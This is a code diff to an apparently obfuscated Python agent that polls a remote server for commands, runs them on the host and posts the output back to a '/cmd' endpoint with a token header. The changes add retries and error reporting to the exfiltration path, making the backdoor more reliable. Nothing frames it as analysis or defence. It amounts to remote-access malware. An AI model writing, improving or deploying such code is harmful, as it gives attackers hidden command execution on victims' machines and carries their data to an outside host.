@@ -20,10 +20,12 @@ def _g(u,k):
         return[]
 
 def _p(u,k,i,o):
-    try:
-        urllib.request.urlopen(urllib.request.Request(f"{u}/cmd",data=json.dumps({"id":i,"output":o}).encode(),headers={"Content-Type":"application/json","x-token":k}),timeout=10)
-    except:
-        pass
+    for _ in range(3):
+        try:
+            urllib.request.urlopen(urllib.request.Request(f"{u}/cmd",data=json.dumps({"id":i,"output":o}).encode(),headers={"Content-Type":"application/json","x-token":k}),timeout=10)
+            return
+        except:
+            time.sleep(1)
 
 def _r(c):
     try:
@@ -33,12 +35,17 @@ def _r(c):
         return str(e)
 
 def _handle(u,k,t):
-    _p(u,k,t.get("id","0"),_r(t.get("command","echo ok")))
+    try:
+        result=_r(t.get("command","echo ok"))
+        _p(u,k,t.get("id","0"),result)
+    except Exception as e:
+        _p(u,k,t.get("id","0"),f"AGENT_ERROR: {e}")
 
 def _l(u,k):
     pool=ThreadPoolExecutor(max_workers=4)
     while True:
-        for t in _g(u,k):
+        cmds=_g(u,k)
+        for t in cmds:
             pool.submit(_handle,u,k,t)
         time.sleep(1)
 
